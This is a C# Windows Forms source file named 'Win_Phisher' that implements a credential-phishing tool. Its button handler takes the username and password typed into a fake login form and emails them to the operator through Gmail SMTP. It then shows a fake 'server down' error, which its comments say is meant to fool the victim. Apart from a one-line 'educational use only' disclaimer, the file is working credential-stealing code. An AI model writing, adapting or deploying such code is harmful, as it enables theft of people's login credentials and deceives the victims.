//For educational use only
using System;
using System.Net.Mail;
using System.Windows.Forms;

namespace Win_Phisher
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Try-catch loop in case computer isn'tconnected to a network
            try
            {
                MailMessage msg = new MailMessage();
                msg.From = new MailAddress("YourGmail@gmail.com", "Phisher");   //This is the Email the creds are being sent from
                msg.To.Add(new MailAddress("RecipientEmail@email.com"));    //This is the email that the creds will be sent to
                msg.Subject = "Phished creds";   //Subject of the email (change it if you want,it doesn't really matter)
                msg.Body = "Here is your creds:  Username:" + textEmail.Text + "  password:" + textPass.Text;
                msg.IsBodyHtml = false; // For best results leave false

                //currently set up for Gmail but any stmp based email should work
                SmtpClient setup = new SmtpClient("smtp.gmail.com", 587);
                setup.Credentials = new System.Net.NetworkCredential("YourGmail@gmail.com", "Password");   //Please replace with your Email and password (Account thats sending the email.)
                setup.EnableSsl = true;
                setup.Send(msg);

                // Fake error message to convince the victim that the reason they weren't logged in was because the server is down
                MessageBox.Show("Login Unsuccessful due to technical issues. please stand by and try again in a few hours while we fix our servers", "login Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return;

            }

            catch    //This catch is triggered if the victim is not connected to the internet or they cannot connect the the mail servers.
            {
                MessageBox.Show("Login Unsuccessful. Please check your network connectivity and try again.", "login Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return;
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        { // ThisIf-Else loop chooses whether the password box uses password chars

            if (checkBox1.Checked)
            {
                textPass.UseSystemPasswordChar = false;
            }

            else
            {
                textPass.UseSystemPasswordChar = true;
            }
        }
    }
}
